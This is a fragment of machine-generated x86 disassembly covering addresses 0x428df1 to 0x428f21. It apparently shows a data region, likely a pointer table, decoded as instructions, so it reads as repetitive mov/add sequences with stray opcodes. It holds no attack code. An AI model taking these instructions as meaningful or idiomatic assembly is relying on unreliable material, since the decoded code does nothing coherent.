  428df1:	mov    BYTE PTR [edx],al
  428df3:	add    BYTE PTR [eax+ecx*4],ch
  428df6:	add    al,BYTE PTR [eax]
  428df8:	mov    BYTE PTR ds:[edx],al
  428dfb:	add    BYTE PTR [eax+ecx*4+0x2],cl
  428dff:	add    BYTE PTR [eax+ecx*4+0x2],bl
  428e03:	add    BYTE PTR [esi-0x78],ch
  428e06:	add    al,BYTE PTR [eax]
  428e08:	or     BYTE PTR [eax-0x7767fffe],0x2
  428e0f:	add    BYTE PTR [edx-0x43fffd78],ch
  428e15:	mov    BYTE PTR [edx],al
  428e17:	add    ah,cl
  428e19:	mov    BYTE PTR [edx],al
  428e1b:	add    ah,bl
  428e1d:	mov    BYTE PTR [edx],al
  428e1f:	add    ah,ch
  428e21:	mov    BYTE PTR [edx],al
  428e23:	add    dh,bh
  428e25:	mov    BYTE PTR [edx],al
  428e27:	add    BYTE PTR [ecx+ecx*4],cl
  428e2a:	add    al,BYTE PTR [eax]
  428e2c:	sbb    cl,BYTE PTR [ecx-0x76cdfffe]
  428e32:	add    al,BYTE PTR [eax]
  428e34:	inc    esp
  428e35:	mov    DWORD PTR [edx],eax
  428e37:	add    BYTE PTR [esi-0x77],dl
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	bound  ecx,QWORD PTR [ecx-0x7691fffe]
  428e42:	add    al,BYTE PTR [eax]
  428e44:	jp     0x428dcf
  428e46:	add    al,BYTE PTR [eax]
  428e48:	mov    cl,BYTE PTR [ecx-0x765ffffe]
  428e4e:	add    al,BYTE PTR [eax]
  428e50:	scas   al,BYTE PTR es:[edi]
  428e51:	mov    DWORD PTR [edx],eax
  428e53:	add    al,al
  428e55:	mov    DWORD PTR [edx],eax
  428e57:	add    dl,dl
  428e59:	mov    DWORD PTR [edx],eax
  428e5b:	add    BYTE PTR [eax],al
  428e5d:	add    BYTE PTR [eax],al
  428e5f:	add    ah,ch
  428e61:	mov    DWORD PTR [edx],eax
  428e63:	add    BYTE PTR [eax],al
  428e65:	add    BYTE PTR [eax],al
  428e67:	add    BYTE PTR [edx],cl
  428e69:	mov    al,BYTE PTR [edx]
  428e6b:	add    BYTE PTR [edx+ecx*4],bl
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	mov    al,BYTE PTR cs:[edx]
  428e73:	add    BYTE PTR [edx+ecx*4+0x2],al
  428e77:	add    BYTE PTR [esi-0x76],dl
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	push   0x7800028a
  428e81:	mov    al,BYTE PTR [edx]
  428e83:	add    BYTE PTR [esi-0x59fffd76],dl
  428e89:	mov    al,BYTE PTR [edx]
  428e8b:	add    BYTE PTR [edx+ecx*4-0x753bfffe],dh
  428e92:	add    al,BYTE PTR [eax]
  428e94:	ror    BYTE PTR [edx-0x751dfffe],cl
  428e9a:	add    al,BYTE PTR [eax]
  428e9c:	out    dx,al
  428e9d:	mov    al,BYTE PTR [edx]
  428e9f:	add    BYTE PTR [eax],al
  428ea1:	mov    eax,DWORD PTR [edx]
  428ea3:	add    BYTE PTR [edx],dl
  428ea5:	mov    eax,DWORD PTR [edx]
  428ea7:	add    BYTE PTR [eax],ch
  428ea9:	mov    eax,DWORD PTR [edx]
  428eab:	add    BYTE PTR [esi],dh
  428ead:	mov    eax,DWORD PTR [edx]
  428eaf:	add    BYTE PTR [edx-0x75],al
  428eb2:	add    al,BYTE PTR [eax]
  428eb4:	pop    esp
  428eb5:	mov    eax,DWORD PTR [edx]
  428eb7:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  428ebb:	add    BYTE PTR [ebx+ecx*4-0x7465fffe],cl
  428ec2:	add    al,BYTE PTR [eax]
  428ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ec5:	mov    eax,DWORD PTR [edx]
  428ec7:	add    BYTE PTR [eax+0x28b],bh
  428ecd:	add    BYTE PTR [eax],al
  428ecf:	add    al,bl
  428ed1:	mov    eax,DWORD PTR [edx]
  428ed3:	add    dl,ah
  428ed5:	mov    eax,DWORD PTR [edx]
  428ed7:	add    al,dh
  428ed9:	mov    eax,DWORD PTR [edx]
  428edb:	add    ah,bh
  428edd:	mov    eax,DWORD PTR [edx]
  428edf:	add    BYTE PTR [esp+ecx*4],cl
  428ee2:	add    al,BYTE PTR [eax]
  428ee4:	sbb    cl,BYTE PTR [edx+eax*1+0x28c2600]
  428eeb:	add    BYTE PTR [eax],dh
  428eed:	mov    WORD PTR [edx],es
  428eef:	add    BYTE PTR [edx-0x74],al
  428ef2:	add    al,BYTE PTR [eax]
  428ef4:	pop    eax
  428ef5:	mov    WORD PTR [edx],es
  428ef7:	add    BYTE PTR [esi-0x74],ch
  428efa:	add    al,BYTE PTR [eax]
  428efc:	test   BYTE PTR [edx+eax*1+0x28c9400],cl
  428f03:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  428f0a:	add    al,BYTE PTR [eax]
  428f0c:	ret    0x28c
  428f0f:	add    dl,bl
  428f11:	mov    WORD PTR [edx],es
  428f13:	add    ah,ah
  428f15:	mov    WORD PTR [edx],es
  428f17:	add    al,dh
  428f19:	mov    WORD PTR [edx],es
  428f1b:	add    dh,bh
  428f1d:	mov    WORD PTR [edx],es
  428f1f:	add    BYTE PTR [eax],al
  428f21:	add    BYTE PTR [eax],al
	...
